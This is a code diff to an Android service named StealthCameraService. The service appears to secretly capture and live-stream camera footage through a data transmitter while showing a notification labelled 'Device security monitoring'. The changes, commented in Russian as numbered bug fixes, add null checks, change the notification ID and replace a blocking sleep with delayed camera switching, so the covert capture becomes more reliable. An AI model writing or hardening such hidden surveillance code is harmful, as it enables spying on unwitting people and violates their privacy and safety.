@@ -78,7 +78,7 @@ public class StealthCameraService extends Service {
         acquireWakeLock();
 
         dataTransmitter.testConnection(deviceId);
-        startForeground(1, createNotification());
+        startForeground(8004, createNotification()); // Bug #35: уникальный ID (1001, 8001-8003 уже заняты)
     }
 
     @Override
@@ -164,7 +164,9 @@ public class StealthCameraService extends Service {
             channel.setDescription("Device security monitoring");
 
             NotificationManager manager = getSystemService(NotificationManager.class);
-            manager.createNotificationChannel(channel);
+            if (manager != null) {
+                manager.createNotificationChannel(channel);
+            }
         }
 
         return new NotificationCompat.Builder(this, channelId)
@@ -221,6 +223,10 @@ public class StealthCameraService extends Service {
             }
 
             Size[] jpegSizes = map.getOutputSizes(ImageFormat.JPEG);
+            if (jpegSizes == null || jpegSizes.length == 0) {
+                Log.e(TAG, "No JPEG output sizes available");
+                return;
+            }
             Size maxSize = jpegSizes[0];
 
             int width = Math.min(maxSize.getWidth(), 1280);
@@ -571,25 +577,22 @@ public class StealthCameraService extends Service {
 
         closeCamera();
 
-        try {
-            Thread.sleep(800);
-        } catch (InterruptedException e) {
-            Log.e(TAG, "Sleep interrupted", e);
-        }
-
+        // Bug #21: Используем postDelayed вместо Thread.sleep чтобы не блокировать main thread
         String newCameraId = currentCameraId.equals(frontCameraId) ? backCameraId : frontCameraId;
         Log.d(TAG, "Switching to camera: " + newCameraId);
 
-        openCamera(newCameraId);
+        backgroundHandler.postDelayed(() -> {
+            openCamera(newCameraId);
 
-        if (wasStreaming) {
-            backgroundHandler.postDelayed(() -> {
-                isLiveStreaming = true;
-                isTransmitting = false;
-                if (captureSession != null) {
-                    backgroundHandler.postDelayed(liveStreamRunnable, 500);
-                }
-            }, 1500);
-        }
+            if (wasStreaming) {
+                backgroundHandler.postDelayed(() -> {
+                    isLiveStreaming = true;
+                    isTransmitting = false;
+                    if (captureSession != null) {
+                        backgroundHandler.postDelayed(liveStreamRunnable, 500);
+                    }
+                }, 1500);
+            }
+        }, 800);
     }
 }
